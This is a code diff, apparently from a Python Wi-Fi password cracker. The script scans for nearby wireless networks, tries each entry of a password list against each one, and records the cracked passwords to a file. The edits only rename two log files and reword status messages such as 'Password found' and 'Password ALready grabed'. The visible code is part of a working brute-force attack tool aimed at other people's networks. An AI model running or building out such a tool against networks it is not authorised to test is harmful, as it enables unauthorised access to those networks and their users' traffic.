@@ -74,7 +74,7 @@ passlist = p_in
 
 
 passwords = [x.strip("\n") for x in open(passlist , "r", encoding="UTF-8" , errors="ignore").readlines()]
-tried = [x.strip("\n").split("--")[0] for x in open("avail_nearby_wifis.txt","r").readlines()]
+tried = [x.strip("\n").split("--")[0] for x in open("nearby_conections.txt","r").readlines()]
 found = [x.strip("\n") for x in open("already_tried_passwords.txt","r").readlines()]
 ts = 15
 
@@ -91,7 +91,7 @@ def main():
 
     num = len(scanner)
 
-    print(f"{r}[!]Number of wifi found: {ran}{str(num)}")
+    print(f"{r}[!]wifi's found: {ran}{str(num)}")
     input(f"{y}\n[?]Press enter to start>")
           
     for i,x in enumerate(scanner):
@@ -101,7 +101,7 @@ def main():
             print(ran + "="*20)
             print(f"{r}Password found : {c}{str(res)}\n")
 
-            with open("avail_nearby_wifis.txt", "a") as f:
+            with open("nearby_conections.txt", "a") as f:
                 f.write(str(res) + "\n")
 
             print(ran + "="*20)
@@ -111,14 +111,14 @@ def test(i ,face,x,key,ts):
     wifi_name = x.bssid if len(x.ssid) > len(x.bssid) else x.ssid
 
     if wifi_name in tried:
-        print(f"{r}[!] {y}Password tried -- {str(wifi_name)}\n{g}Password is known!")
+        print(f"{r}[!] {y}Tryed -- {str(wifi_name)}\n{g}Password known!")
         return False
 
-    print(ran + "Trying to connect to wifi "+str(wifi_name))
+    print(ran + "Trying : "+str(wifi_name))
 
     for n,password in enumerate(key):
         if wifi_name+"--"+password in found:
-            print(r + "Password already found +_+")
+            print(r + "Password ALready grabed")
 
             continue
         else:
